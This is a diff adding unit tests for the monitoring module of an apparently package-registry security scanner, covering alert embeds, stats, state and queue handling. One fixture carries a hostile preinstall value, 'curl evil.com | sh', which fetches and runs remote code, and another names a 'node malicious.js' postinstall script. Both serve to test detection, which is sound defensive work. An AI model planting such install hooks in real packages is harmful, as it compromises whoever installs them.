+    const todayEntry = data.daily.find(d => d.date === today);
+    assert(todayEntry, 'Should have a daily entry for today');
+    assert(typeof todayEntry.scanned === 'number', 'Daily scanned should be a number');
+    assert(typeof todayEntry.fp_rate === 'number', 'Daily fp_rate should be a number');
+  });
+
+  // --- getDetectionStats extended ---
+
+  test('MONITOR: getDetectionStats returns expected structure', () => {
+    const stats = getDetectionStats();
+    assert(typeof stats.total === 'number', 'Should have total');
+    assert(typeof stats.bySeverity === 'object', 'Should have bySeverity');
+    assert(typeof stats.byEcosystem === 'object', 'Should have byEcosystem');
+    assert(stats.leadTime === null || typeof stats.leadTime === 'object', 'leadTime should be null or object');
+  });
+
+  // --- isBundledToolingOnly extended ---
+
+  test('MONITOR: isBundledToolingOnly returns true for known bundled files', () => {
+    const threats = [{ file: 'node_modules/.cache/webpack.js', severity: 'HIGH' }];
+    assert(isBundledToolingOnly(threats) === true, 'Should detect webpack.js as bundled');
+  });
+
+  test('MONITOR: isBundledToolingOnly returns true for Next.js chunks', () => {
+    const threats = [{ file: '_next/static/chunks/main.js', severity: 'MEDIUM' }];
+    assert(isBundledToolingOnly(threats) === true, 'Should detect Next.js chunks as bundled');
+  });
+
+  test('MONITOR: isBundledToolingOnly returns false for mixed threats', () => {
+    const threats = [
+      { file: 'webpack.js', severity: 'HIGH' },
+      { file: 'src/index.js', severity: 'CRITICAL' }
+    ];
+    assert(isBundledToolingOnly(threats) === false, 'Should return false when not all threats are bundled');
+  });
+
+  test('MONITOR: isBundledToolingOnly returns false for empty threats', () => {
+    assert(isBundledToolingOnly([]) === false, 'Should return false for empty array');
+  });
+
+  // --- hasHighOrCritical extended ---
+
+  test('MONITOR: hasHighOrCritical returns true for high', () => {
+    assert(hasHighOrCritical({ summary: { critical: 0, high: 1 } }) === true, 'Should return true for high');
+  });
+
+  test('MONITOR: hasHighOrCritical returns false for medium only', () => {
+    assert(hasHighOrCritical({ summary: { critical: 0, high: 0, medium: 5 } }) === false, 'Should return false for medium only');
+  });
+
+  // --- isVerboseMode / setVerboseMode ---
+
+  test('MONITOR: setVerboseMode and isVerboseMode round-trip', () => {
+    const origVerbose = isVerboseMode();
+    const origEnv = process.env.MUADDIB_MONITOR_VERBOSE;
+    delete process.env.MUADDIB_MONITOR_VERBOSE;
+    try {
+      setVerboseMode(false);
+      assert(isVerboseMode() === false, 'Should be false after setVerboseMode(false)');
+      setVerboseMode(true);
+      assert(isVerboseMode() === true, 'Should be true after setVerboseMode(true)');
+    } finally {
+      setVerboseMode(origVerbose);
+      if (origEnv !== undefined) process.env.MUADDIB_MONITOR_VERBOSE = origEnv;
+    }
+  });
+
+  test('MONITOR: isVerboseMode reads from env', () => {
+    const origEnv = process.env.MUADDIB_MONITOR_VERBOSE;
+    setVerboseMode(false);
+    process.env.MUADDIB_MONITOR_VERBOSE = 'true';
+    try {
+      assert(isVerboseMode() === true, 'Should return true when env is true');
+    } finally {
+      if (origEnv !== undefined) {
+        process.env.MUADDIB_MONITOR_VERBOSE = origEnv;
+      } else {
+        delete process.env.MUADDIB_MONITOR_VERBOSE;
+      }
+    }
+  });
+
+  // --- timeoutPromise ---
+
+  await asyncTest('MONITOR: timeoutPromise rejects after timeout', async () => {
+    try {
+      await Promise.race([
+        new Promise(resolve => setTimeout(resolve, 5000)),
+        timeoutPromise(50)
+      ]);
+      assert(false, 'Should have thrown');
+    } catch (err) {
+      assertIncludes(err.message, 'timeout', 'Should mention timeout');
+    }
+  });
+
+  // --- appendAlert extended ---
+
+  test('MONITOR: appendAlert writes to alerts file', () => {
+    const alert = {
+      timestamp: new Date().toISOString(),
+      name: 'test-append-alert-pkg',
+      version: '1.0.0',
+      ecosystem: 'npm',
+      findings: [{ rule: 'TEST-001', severity: 'LOW' }]
+    };
+    appendAlert(alert);
+    // Verify it was appended
+    const raw = fs.readFileSync(ALERTS_FILE, 'utf8');
+    const alerts = JSON.parse(raw);
+    const found = alerts.find(a => a.name === 'test-append-alert-pkg');
+    assert(found, 'Should find the appended alert');
+    assert(found.version === '1.0.0', 'Version should match');
+  });
+
+  // --- appendDetection extended ---
+
+  test('MONITOR: appendDetection deduplicates', () => {
+    const name = 'test-dedup-detection-' + Date.now();
+    appendDetection(name, '1.0.0', 'npm', ['test_type'], 'HIGH');
+    appendDetection(name, '1.0.0', 'npm', ['test_type'], 'HIGH'); // duplicate
+    const data = loadDetections();
+    const matches = data.detections.filter(d => d.package === name);
+    assert(matches.length === 1, 'Should deduplicate, got ' + matches.length);
+  });
+
+  // --- loadDetections ---
+
+  test('MONITOR: loadDetections returns object with detections array', () => {
+    const data = loadDetections();
+    assert(typeof data === 'object', 'Should return object');
+    assert(Array.isArray(data.detections), 'Should have detections array');
+  });
+
+  // --- buildTemporalWebhookEmbed extended ---
+
+  test('MONITOR: buildTemporalWebhookEmbed handles CRITICAL severity', () => {
+    const embed = buildTemporalWebhookEmbed({
+      packageName: 'evil-pkg',
+      previousVersion: '1.0.0',
+      latestVersion: '1.0.1',
+      metadata: { latestPublishedAt: '2024-01-01' },
+      findings: [{ type: 'lifecycle_added', severity: 'CRITICAL', script: 'preinstall', value: 'curl evil.com | sh' }]
+    });
+    assert(embed.embeds, 'Should have embeds');
+    assert(embed.embeds[0].color === 0xe74c3c, 'CRITICAL should be red');
+    assertIncludes(embed.embeds[0].title, 'CRITICAL', 'Title should mention CRITICAL');
+  });
+
+  test('MONITOR: buildTemporalWebhookEmbed handles lifecycle_modified', () => {
+    const embed = buildTemporalWebhookEmbed({
+      packageName: 'modified-pkg',
+      previousVersion: '1.0.0',
+      latestVersion: '1.0.1',
+      metadata: { latestPublishedAt: '2024-01-01' },
+      findings: [{ type: 'lifecycle_modified', severity: 'HIGH', script: 'postinstall', newValue: 'node malicious.js' }]
+    });
+    const field = embed.embeds[0].fields.find(f => f.name === 'Changes Detected');
+    assertIncludes(field.value, 'MODIFIED', 'Should show MODIFIED for lifecycle_modified');
+  });
+
+  // --- buildTemporalAstWebhookEmbed extended ---
+
+  test('MONITOR: buildTemporalAstWebhookEmbed has correct structure', () => {
+    const embed = buildTemporalAstWebhookEmbed({
+      packageName: 'ast-changed-pkg',
+      previousVersion: '1.0.0',
+      latestVersion: '1.0.1',
+      metadata: { latestPublishedAt: '2024-01-01' },
+      findings: [{ pattern: 'child_process.exec', severity: 'CRITICAL', description: 'Added child_process.exec' }]
+    });
+    assert(embed.embeds, 'Should have embeds');
+    const e = embed.embeds[0];
+    assertIncludes(e.title, 'AST ANOMALY', 'Title should mention AST ANOMALY');
+    const pkgField = e.fields.find(f => f.name === 'Package');
+    assertIncludes(pkgField.value, 'ast-changed-pkg', 'Should contain package name');
+  });
+
+  // --- buildPublishAnomalyWebhookEmbed extended ---
+
+  test('MONITOR: buildPublishAnomalyWebhookEmbed handles CRITICAL severity', () => {
+    const embed = buildPublishAnomalyWebhookEmbed({
+      packageName: 'burst-pkg',
+      versionCount: 50,
+      anomalies: [{ type: 'publish_burst', severity: 'CRITICAL', description: '50 versions in 1h' }]
+    });
+    assert(embed.embeds, 'Should have embeds');
+    assert(embed.embeds[0].color === 0xe74c3c, 'CRITICAL should be red');
+  });
+
+  test('MONITOR: buildPublishAnomalyWebhookEmbed handles MEDIUM severity', () => {
+    const embed = buildPublishAnomalyWebhookEmbed({
+      packageName: 'minor-pkg',
+      versionCount: 10,
+      anomalies: [{ type: 'rapid_succession', severity: 'MEDIUM', description: '10 versions in 24h' }]
+    });
+    assert(embed.embeds, 'Should have embeds');
+    assert(embed.embeds[0].color === 0xf1c40f, 'MEDIUM should be yellow');
+  });
+
+  // --- buildMaintainerChangeWebhookEmbed extended ---
+
+  test('MONITOR: buildMaintainerChangeWebhookEmbed has correct structure', () => {
+    const embed = buildMaintainerChangeWebhookEmbed({
+      packageName: 'hijacked-pkg',
+      findings: [{ type: 'sole_maintainer_change', severity: 'CRITICAL', description: 'Sole maintainer changed', riskAssessment: { reasons: ['new account'] } }]
+    });
+    assert(embed.embeds, 'Should have embeds');
+    const e = embed.embeds[0];
+    assertIncludes(e.title, 'MAINTAINER CHANGE', 'Title should mention MAINTAINER CHANGE');
+    assert(e.color === 0xe74c3c, 'CRITICAL should be red');
+    const findingsField = e.fields.find(f => f.name === 'Findings');
+    assertIncludes(findingsField.value, 'sole_maintainer_change', 'Should mention the finding type');
+    assertIncludes(findingsField.value, 'new account', 'Should include risk assessment');
+  });
+
+  test('MONITOR: buildMaintainerChangeWebhookEmbed handles HIGH severity', () => {
+    const embed = buildMaintainerChangeWebhookEmbed({
+      packageName: 'changed-pkg',
+      findings: [{ type: 'new_maintainer', severity: 'HIGH', description: 'New maintainer added', riskAssessment: { reasons: [] } }]
+    });
+    assert(embed.embeds[0].color === 0xe67e22, 'HIGH should be orange');
+  });
+
+  // --- loadState / saveState extended ---
+
+  test('MONITOR: saveState persists lastDailyReportDate from stats', () => {
+    const tmpStateFile = STATE_FILE;
+    const origDate = stats.lastDailyReportDate;
+    stats.lastDailyReportDate = '2024-06-15';
+    try {
+      saveState({ npmLastPackage: 'test-save', pypiLastPackage: 'test-pypi' });
+      const raw = fs.readFileSync(tmpStateFile, 'utf8');
+      const data = JSON.parse(raw);
+      assert(data.lastDailyReportDate === '2024-06-15', 'Should persist lastDailyReportDate');
+      assert(data.npmLastPackage === 'test-save', 'Should persist npmLastPackage');
+    } finally {
+      stats.lastDailyReportDate = origDate;
+    }
+  });
+
+  test('MONITOR: loadState restores lastDailyReportDate into stats', () => {
+    const origDate = stats.lastDailyReportDate;
+    stats.lastDailyReportDate = '2024-06-15';
+    saveState({ npmLastPackage: 'restore-test', pypiLastPackage: '' });
+    stats.lastDailyReportDate = null; // clear
+    try {
+      const state = loadState();
+      assert(stats.lastDailyReportDate === '2024-06-15', 'Should restore lastDailyReportDate from file');
+      assert(state.npmLastPackage === 'restore-test', 'Should restore npmLastPackage');
+    } finally {
+      stats.lastDailyReportDate = origDate;
+    }
+  });
+
+  // --- isDailyReportDue ---
+
+  test('MONITOR: isDailyReportDue returns false when already sent today', () => {
+    const origDate = stats.lastDailyReportDate;
+    stats.lastDailyReportDate = getParisDateString(); // today
+    try {
+      assert(isDailyReportDue() === false, 'Should be false when already sent today');
+    } finally {
+      stats.lastDailyReportDate = origDate;
+    }
+  });
+
+  // ============================================
+  // COVERAGE BOOST TESTS (monkey-patched)
+  // ============================================
+
+  console.log('\n=== MONITOR COVERAGE BOOST TESTS ===\n');
+
+  // --- trySendWebhook with mocked webhook (IOC match) ---
+
+  await asyncTest('MONITOR-COV: trySendWebhook attempts send for IOC match', async () => {
+    const origEnv = process.env.MUADDIB_WEBHOOK_URL;
+    const origLog = console.log;
+    const origErr = console.error;
+    const logs = [];
+    const errors = [];
+    process.env.MUADDIB_WEBHOOK_URL = 'https://hooks.example.com/test';
+    console.log = (...args) => logs.push(args.join(' '));
+    console.error = (...args) => errors.push(args.join(' '));
+
+    try {
+      const mockResult = {
+        threats: [{ type: 'known_malicious_package', severity: 'CRITICAL' }],
+        summary: { critical: 1, high: 0, medium: 0, low: 0, total: 1 }
+      };
+      await trySendWebhook('evil-pkg', '1.0.0', 'npm', mockResult, null);
+      // Will either succeed (unlikely) or fail with network error (expected)
+      const anyLog = logs.concat(errors).join(' ');
+      assert(anyLog.includes('evil-pkg'), 'Should reference the package name');
+    } finally {
+      console.log = origLog;
+      console.error = origErr;
+      if (origEnv !== undefined) process.env.MUADDIB_WEBHOOK_URL = origEnv;
+      else delete process.env.MUADDIB_WEBHOOK_URL;
+    }
+  });
+
+  await asyncTest('MONITOR-COV: trySendWebhook does not send for false positive', async () => {
+    const origEnv = process.env.MUADDIB_WEBHOOK_URL;
+    const origLog = console.log;
+    const logs = [];
+    process.env.MUADDIB_WEBHOOK_URL = 'https://hooks.example.com/test';
+    console.log = (...args) => logs.push(args.join(' '));
+
+    try {
+      const mockResult = {
+        threats: [{ type: 'suspicious_dataflow', severity: 'HIGH' }],
+        summary: { critical: 0, high: 1, medium: 0, low: 0, total: 1 }
+      };
+      await trySendWebhook('safe-pkg', '1.0.0', 'npm', mockResult, { score: 0 });
+      const fpLog = logs.find(l => l.includes('FALSE POSITIVE'));
+      assert(fpLog !== undefined, 'Should log FALSE POSITIVE message');
+    } finally {
+      console.log = origLog;
+      if (origEnv !== undefined) process.env.MUADDIB_WEBHOOK_URL = origEnv;
+      else delete process.env.MUADDIB_WEBHOOK_URL;
+    }
+  });
+
+  await asyncTest('MONITOR-COV: trySendWebhook attempts send for positive sandbox', async () => {
+    const origEnv = process.env.MUADDIB_WEBHOOK_URL;
+    const origLog = console.log;
+    const origErr = console.error;
+    const logs = [];
+    const errors = [];
+    process.env.MUADDIB_WEBHOOK_URL = 'https://hooks.example.com/test';
+    console.log = (...args) => logs.push(args.join(' '));
+    console.error = (...args) => errors.push(args.join(' '));
+
+    try {
+      const mockResult = {
+        threats: [{ type: 'dynamic_require', severity: 'HIGH' }],
+        summary: { critical: 0, high: 1, medium: 0, low: 0, total: 1 }
+      };
+      await trySendWebhook('suspect-pkg', '1.0', 'npm', mockResult, { score: 75, severity: 'HIGH' });
+      const anyLog = logs.concat(errors).join(' ');
+      assert(anyLog.includes('suspect-pkg'), 'Should reference the package name');
+    } finally {
+      console.log = origLog;
+      console.error = origErr;
+      if (origEnv !== undefined) process.env.MUADDIB_WEBHOOK_URL = origEnv;
+      else delete process.env.MUADDIB_WEBHOOK_URL;
+    }
+  });
+
+  await asyncTest('MONITOR-COV: trySendWebhook handles webhook failure gracefully', async () => {
+    const origEnv = process.env.MUADDIB_WEBHOOK_URL;
+    const origLog = console.log;
+    const origErr = console.error;
+    const errors = [];
+    process.env.MUADDIB_WEBHOOK_URL = 'https://hooks.example.com/test';
+    console.log = () => {};
+    console.error = (...args) => errors.push(args.join(' '));
+
+    try {
+      const mockResult = {
+        threats: [{ type: 'known_malicious_package', severity: 'CRITICAL' }],
+        summary: { critical: 1, high: 0, medium: 0, low: 0, total: 1 }
+      };
+      await trySendWebhook('evil-pkg', '1.0.0', 'npm', mockResult, null);
+      // Webhook to fake URL will fail, error should be caught
+      const errLog = errors.find(l => l.includes('Webhook failed') || l.includes('evil-pkg'));
+      assert(errLog !== undefined, 'Should log webhook failure or reference package');
+    } finally {
+      console.log = origLog;
+      console.error = origErr;
+      if (origEnv !== undefined) process.env.MUADDIB_WEBHOOK_URL = origEnv;
+      else delete process.env.MUADDIB_WEBHOOK_URL;
+    }
+  });
+
+  // --- reportStats test ---
+
+  test('MONITOR-COV: reportStats logs formatted stats with correct values', () => {
+    const origLog = console.log;
+    const logs = [];
+    console.log = (...args) => logs.push(args.join(' '));
+
+    // Save original stats values
+    const origScanned = stats.scanned;
+    const origClean = stats.clean;
+    const origSuspect = stats.suspect;
+    const origErrors = stats.errors;
+    const origTime = stats.totalTimeMs;
+
+    stats.scanned = 10;
+    stats.clean = 8;
+    stats.suspect = 2;
+    stats.errors = 0;
+    stats.totalTimeMs = 50000;
+
+    try {
+      reportStats();
+      const statsLog = logs.find(l => l.includes('[MONITOR] Stats:'));
+      assert(statsLog !== undefined, 'Should log stats');
+      assert(statsLog.includes('10 scanned'), 'Should include scanned count');
+      assert(statsLog.includes('8 clean'), 'Should include clean count');
+      assert(statsLog.includes('2 suspect'), 'Should include suspect count');
+      assert(statsLog.includes('0 errors'), 'Should include error count');
+      assert(statsLog.includes('5.0'), 'Should include avg time (50000/10/1000=5.0)');
+    } finally {
+      console.log = origLog;
+      stats.scanned = origScanned;
+      stats.clean = origClean;
+      stats.suspect = origSuspect;
+      stats.errors = origErrors;
+      stats.totalTimeMs = origTime;
+    }
+  });
+
+  test('MONITOR-COV: reportStats handles zero scanned (no division error)', () => {
+    const origLog = console.log;
+    const logs = [];
+    console.log = (...args) => logs.push(args.join(' '));
+
+    const origScanned = stats.scanned;
+    const origClean = stats.clean;
+    const origSuspect = stats.suspect;
+    const origErrors = stats.errors;
+    const origTime = stats.totalTimeMs;
+
+    stats.scanned = 0;
+    stats.clean = 0;
+    stats.suspect = 0;
+    stats.errors = 0;
+    stats.totalTimeMs = 0;
+
+    try {
+      reportStats();
+      const statsLog = logs.find(l => l.includes('[MONITOR] Stats:'));
+      assert(statsLog !== undefined, 'Should log stats even when 0');
+      assert(statsLog.includes('0 scanned'), 'Should show 0 scanned');
+      assert(statsLog.includes('avg 0.0'), 'Should show avg 0.0 (no div by zero)');
+    } finally {
+      console.log = origLog;
+      stats.scanned = origScanned;
+      stats.clean = origClean;
+      stats.suspect = origSuspect;
+      stats.errors = origErrors;
+      stats.totalTimeMs = origTime;
+    }
+  });
+
+  test('MONITOR-COV: reportStats pluralizes errors correctly', () => {
+    const origLog = console.log;
+    const logs = [];
+    console.log = (...args) => logs.push(args.join(' '));
+
+    const origScanned = stats.scanned;
+    const origErrors = stats.errors;
+
+    stats.scanned = 1;
+    stats.errors = 1;
+
+    try {
+      reportStats();
+      const statsLog = logs.find(l => l.includes('[MONITOR] Stats:'));
+      assert(statsLog !== undefined, 'Should log stats');
+      // When errors === 1, should not have plural 's'
+      assert(statsLog.includes('1 error,') || statsLog.includes('1 error '), 'Should show singular error');
+    } finally {
+      console.log = origLog;
+      stats.scanned = origScanned;
+      stats.errors = origErrors;
+    }
+  });
+
+  // --- cleanupOrphanTmpDirs test ---
+
+  test('MONITOR-COV: cleanupOrphanTmpDirs cleans old directories with files', () => {
+    const tmpBase = path.join(os.tmpdir(), 'muaddib-monitor');
+    if (!fs.existsSync(tmpBase)) fs.mkdirSync(tmpBase, { recursive: true });
+
+    // Create a fake old directory with nested content
+    const oldDir = path.join(tmpBase, 'test-pkg-cleanup-' + Date.now());
+    fs.mkdirSync(oldDir, { recursive: true });
+    fs.writeFileSync(path.join(oldDir, 'test.txt'), 'test content');
+    const subDir = path.join(oldDir, 'subdir');
+    fs.mkdirSync(subDir, { recursive: true });
+    fs.writeFileSync(path.join(subDir, 'nested.txt'), 'nested');
+
+    const origLog = console.log;
+    const logs = [];
+    console.log = (...args) => logs.push(args.join(' '));
+
+    try {
+      assert(fs.existsSync(oldDir), 'Old dir should exist before cleanup');
+      cleanupOrphanTmpDirs();
+      assert(!fs.existsSync(oldDir), 'Old dir should be removed after cleanup');
+      const cleanupLog = logs.find(l => l.includes('Cleaned up') && l.includes('orphan'));
+      assert(cleanupLog !== undefined, 'Should log cleanup message');
+    } finally {
+      console.log = origLog;
+      try { fs.rmSync(oldDir, { recursive: true, force: true }); } catch {}
+    }
+  });
+
+  // --- sendDailyReport test ---
+
+  await asyncTest('MONITOR-COV: sendDailyReport resets counters when webhook set', async () => {
+    const origEnv = process.env.MUADDIB_WEBHOOK_URL;
+    const origLog = console.log;
+    const origErr = console.error;
+    console.log = () => {};
+    console.error = () => {};
+
+    process.env.MUADDIB_WEBHOOK_URL = 'https://hooks.example.com/test';
+
+    const webhookModule = require('../../src/webhook.js');
+    const origSendWebhook = webhookModule.sendWebhook;
+    webhookModule.sendWebhook = async () => {};
+
+    // Save original values
+    const origScanned = stats.scanned;
+    const origClean = stats.clean;
+    const origSuspect = stats.suspect;
+    const origErrors = stats.errors;
+    const origTotalTimeMs = stats.totalTimeMs;
+    const origDailyLen = dailyAlerts.length;
+    const origRecentSize = recentlyScanned.size;
+    const origLastDate = stats.lastDailyReportDate;
+
+    // Set some values
+    stats.scanned = 5;
+    stats.clean = 3;
+    stats.suspect = 2;
+    stats.errors = 0;
+    stats.totalTimeMs = 25000;
+    dailyAlerts.push({ name: 'test', version: '1.0', ecosystem: 'npm', findingsCount: 1 });
+    recentlyScanned.add('npm/daily-report-test@1.0.0');
+
+    try {
+      await sendDailyReport();
+      // After sendDailyReport, counters should be reset
+      assert(stats.scanned === 0, 'scanned should be reset to 0, got ' + stats.scanned);
+      assert(stats.clean === 0, 'clean should be reset to 0, got ' + stats.clean);
+      assert(stats.suspect === 0, 'suspect should be reset to 0, got ' + stats.suspect);
+      assert(stats.errors === 0, 'errors should be reset to 0');
+      assert(stats.totalTimeMs === 0, 'totalTimeMs should be reset to 0');
+      assert(dailyAlerts.length === 0, 'dailyAlerts should be cleared');
+      assert(recentlyScanned.size === 0, 'recentlyScanned should be cleared');
+      assert(stats.lastDailyReportDate === getParisDateString(), 'lastDailyReportDate should be today');
+    } finally {
+      webhookModule.sendWebhook = origSendWebhook;
+      console.log = origLog;
+      console.error = origErr;
+      // Restore stats
+      stats.scanned = origScanned;
+      stats.clean = origClean;
+      stats.suspect = origSuspect;
+      stats.errors = origErrors;
+      stats.totalTimeMs = origTotalTimeMs;
+      dailyAlerts.length = 0;
+      recentlyScanned.clear();
+      stats.lastDailyReportDate = origLastDate;
+      if (origEnv !== undefined) process.env.MUADDIB_WEBHOOK_URL = origEnv;
+      else delete process.env.MUADDIB_WEBHOOK_URL;
+    }
+  });
+
+  await asyncTest('MONITOR-COV: sendDailyReport handles webhook failure gracefully', async () => {
+    const origEnv = process.env.MUADDIB_WEBHOOK_URL;
+    const origLog = console.log;
+    const origErr = console.error;
+    const errors = [];
+    console.log = () => {};
+    console.error = (...args) => errors.push(args.join(' '));
+
+    process.env.MUADDIB_WEBHOOK_URL = 'https://hooks.example.com/test';
+
+    const webhookModule = require('../../src/webhook.js');
+    const origSendWebhook = webhookModule.sendWebhook;
+    webhookModule.sendWebhook = async () => { throw new Error('webhook failure test'); };
+
+    const origScanned = stats.scanned;
+    const origClean = stats.clean;
+    const origSuspect = stats.suspect;
+    const origErrors = stats.errors;
+    const origLastDate = stats.lastDailyReportDate;
+
+    stats.scanned = 1;
+
+    try {
+      await sendDailyReport();
+      const errLog = errors.find(l => l.includes('Daily report webhook failed'));
+      assert(errLog !== undefined, 'Should log webhook failure');
+      // Counters should still be reset even on webhook failure
+      assert(stats.scanned === 0, 'scanned should be reset even on failure');
+    } finally {
+      webhookModule.sendWebhook = origSendWebhook;
+      console.log = origLog;
+      console.error = origErr;
+      stats.scanned = origScanned;
+      stats.clean = origClean;
+      stats.suspect = origSuspect;
+      stats.errors = origErrors;
+      stats.lastDailyReportDate = origLastDate;
+      if (origEnv !== undefined) process.env.MUADDIB_WEBHOOK_URL = origEnv;
+      else delete process.env.MUADDIB_WEBHOOK_URL;
+    }
+  });
+
+  // --- processQueue test ---
+
+  await asyncTest('MONITOR-COV: processQueue processes empty queue without error', async () => {
+    // Clear queue
+    scanQueue.length = 0;
+    await processQueue();
+    assert(scanQueue.length === 0, 'Queue should remain empty');
+  });
+
+  await asyncTest('MONITOR-COV: processQueue handles errors in resolveTarballAndScan', async () => {
+    const origLog = console.log;
+    const origErr = console.error;
+    const errors = [];
+    console.log = () => {};
+    console.error = (...args) => errors.push(args.join(' '));
+
+    const origErrors2 = stats.errors;
+
+    // Push an item that will fail (invalid ecosystem/tarball)
+    scanQueue.length = 0;
+    scanQueue.push({
+      name: 'processqueue-test-nonexistent-pkg-' + Date.now(),
+      version: '0.0.1',
+      ecosystem: 'npm',
+      tarballUrl: null
+    });
+
+    try {
+      await processQueue();
+      // processQueue should have caught errors, not thrown
+      assert(scanQueue.length === 0, 'Queue should be drained after processing');
+    } finally {
+      console.log = origLog;
+      console.error = origErr;
+      stats.errors = origErrors2;
+    }
+  });
+
+  // --- runTemporalCheck with disabled features ---
+
+  await asyncTest('MONITOR-COV: runTemporalCheck returns null when all temporal disabled', async () => {
+    const origEnvs = {
+      temporal: process.env.MUADDIB_MONITOR_TEMPORAL,
+      ast: process.env.MUADDIB_MONITOR_TEMPORAL_AST,
+      publish: process.env.MUADDIB_MONITOR_TEMPORAL_PUBLISH,
+      maintainer: process.env.MUADDIB_MONITOR_TEMPORAL_MAINTAINER
+    };
+    const origLog = console.log;
+    console.log = () => {};
+
+    process.env.MUADDIB_MONITOR_TEMPORAL = 'false';
+    process.env.MUADDIB_MONITOR_TEMPORAL_AST = 'false';
+    process.env.MUADDIB_MONITOR_TEMPORAL_PUBLISH = 'false';
+    process.env.MUADDIB_MONITOR_TEMPORAL_MAINTAINER = 'false';
+
+    try {
+      const result = await runTemporalCheck('express');
+      assert(result === null, 'runTemporalCheck should return null when disabled');
+
+      const astResult = await runTemporalAstCheck('express');
+      assert(astResult === null, 'runTemporalAstCheck should return null when disabled');
+
+      const publishResult = await runTemporalPublishCheck('express');
+      assert(publishResult === null, 'runTemporalPublishCheck should return null when disabled');
+
+      const maintainerResult = await runTemporalMaintainerCheck('express');
+      assert(maintainerResult === null, 'runTemporalMaintainerCheck should return null when disabled');
+    } finally {
+      console.log = origLog;
+      for (const [key, val] of Object.entries(origEnvs)) {
+        const envKey = key === 'temporal' ? 'MUADDIB_MONITOR_TEMPORAL'
+          : key === 'ast' ? 'MUADDIB_MONITOR_TEMPORAL_AST'
+          : key === 'publish' ? 'MUADDIB_MONITOR_TEMPORAL_PUBLISH'
+          : 'MUADDIB_MONITOR_TEMPORAL_MAINTAINER';
+        if (val !== undefined) process.env[envKey] = val;
+        else delete process.env[envKey];
+      }
+    }
+  });
+
+  // --- resolveTarballAndScan extended ---
+
+  await asyncTest('MONITOR-COV: resolveTarballAndScan handles npm package with no tarball', async () => {
+    const origLog = console.log;
+    const origErr = console.error;
+    const logs = [];
+    const errors = [];
+    console.log = (...args) => logs.push(args.join(' '));
+    console.error = (...args) => errors.push(args.join(' '));
+
+    const origErrors2 = stats.errors;
+
+    try {
+      // Use a non-existent package name so getNpmLatestTarball fails
+      const item = {
+        name: 'muaddib-nonexistent-test-pkg-' + Date.now(),
+        version: '',
+        ecosystem: 'npm',
+        tarballUrl: null
+      };
+      // Clear dedup so it doesn't skip
+      recentlyScanned.delete(`npm/${item.name}@`);
+      recentlyScanned.delete(`npm/${item.name}@${item.version}`);
+
+      await resolveTarballAndScan(item);
+      // Should log error resolving tarball
+      const errorLog = errors.find(l => l.includes('ERROR resolving npm tarball'));
+      const skipLog = logs.find(l => l.includes('SKIP') && l.includes('no tarball'));
+      // Either an error or a skip is expected
+      assert(errorLog !== undefined || skipLog !== undefined,
+        'Should log error or skip for non-existent npm package');
+    } finally {
+      console.log = origLog;
+      console.error = origErr;
+      stats.errors = origErrors2;
+    }
+  });
+
+  await asyncTest('MONITOR-COV: resolveTarballAndScan handles pypi package with no tarball', async () => {
+    const origLog = console.log;
+    const origErr = console.error;
+    const logs = [];
+    const errors = [];
+    console.log = (...args) => logs.push(args.join(' '));
+    console.error = (...args) => errors.push(args.join(' '));
+
+    const origErrors2 = stats.errors;
+
+    try {
+      const item = {
+        name: 'muaddib-nonexistent-pypi-test-' + Date.now(),
+        version: '',
+        ecosystem: 'pypi',
+        tarballUrl: null
+      };
+      recentlyScanned.delete(`pypi/${item.name}@`);
+      recentlyScanned.delete(`pypi/${item.name}@${item.version}`);
+
+      await resolveTarballAndScan(item);
+      // Should log error resolving tarball
+      const errorLog = errors.find(l => l.includes('ERROR resolving PyPI tarball'));
+      const skipLog = logs.find(l => l.includes('SKIP') && l.includes('no tarball'));
+      assert(errorLog !== undefined || skipLog !== undefined,
+        'Should log error or skip for non-existent PyPI package');
+    } finally {
+      console.log = origLog;
+      console.error = origErr;
+      stats.errors = origErrors2;
+    }
+  });
+
+  // --- isTemporalMaintainerEnabled ---
+
+  test('MONITOR-COV: isTemporalMaintainerEnabled returns true by default', () => {
+    const origEnv = process.env.MUADDIB_MONITOR_TEMPORAL_MAINTAINER;
+    delete process.env.MUADDIB_MONITOR_TEMPORAL_MAINTAINER;
+    try {
+      assert(isTemporalMaintainerEnabled() === true, 'Should be true by default');
+    } finally {
+      if (origEnv !== undefined) process.env.MUADDIB_MONITOR_TEMPORAL_MAINTAINER = origEnv;
+    }
+  });
+
+  test('MONITOR-COV: isTemporalMaintainerEnabled returns false when set to false', () => {
+    const origEnv = process.env.MUADDIB_MONITOR_TEMPORAL_MAINTAINER;
+    process.env.MUADDIB_MONITOR_TEMPORAL_MAINTAINER = 'false';
+    try {
+      assert(isTemporalMaintainerEnabled() === false, 'Should be false when env is false');
+    } finally {
+      if (origEnv !== undefined) process.env.MUADDIB_MONITOR_TEMPORAL_MAINTAINER = origEnv;
+      else delete process.env.MUADDIB_MONITOR_TEMPORAL_MAINTAINER;
+    }
+  });
+
+  test('MONITOR-COV: isTemporalMaintainerEnabled returns false for FALSE (case insensitive)', () => {
+    const origEnv = process.env.MUADDIB_MONITOR_TEMPORAL_MAINTAINER;
+    process.env.MUADDIB_MONITOR_TEMPORAL_MAINTAINER = 'FALSE';
+    try {
+      assert(isTemporalMaintainerEnabled() === false, 'Should be false for uppercase FALSE');
+    } finally {
+      if (origEnv !== undefined) process.env.MUADDIB_MONITOR_TEMPORAL_MAINTAINER = origEnv;
+      else delete process.env.MUADDIB_MONITOR_TEMPORAL_MAINTAINER;
+    }
+  });
+
+  // --- buildMaintainerChangeWebhookEmbed extended ---
+
+  test('MONITOR-COV: buildMaintainerChangeWebhookEmbed handles MEDIUM severity', () => {
+    const embed = buildMaintainerChangeWebhookEmbed({
+      packageName: 'medium-pkg',
+      findings: [{ type: 'suspicious_maintainer', severity: 'MEDIUM', description: 'Suspicious patterns', riskAssessment: { reasons: [] } }]
+    });
+    assert(embed.embeds[0].color === 0xf1c40f, 'MEDIUM should be yellow');
+  });
+
+  test('MONITOR-COV: buildMaintainerChangeWebhookEmbed handles empty findings', () => {
+    const embed = buildMaintainerChangeWebhookEmbed({
+      packageName: 'no-findings-pkg',
+      findings: []
+    });
+    assert(embed.embeds, 'Should still have embeds');
+    const findingsField = embed.embeds[0].fields.find(f => f.name === 'Findings');
+    assert(findingsField.value === 'None', 'Should show None for empty findings');
+  });
+
+  // --- buildDailyReportEmbed with daily alerts ---
+
+  test('MONITOR-COV: buildDailyReportEmbed includes daily alert suspects', () => {
+    const origLog = console.log;
+    console.log = () => {};
+
+    const origScanned = stats.scanned;
+    const origSuspect = stats.suspect;
+    stats.scanned = 5;
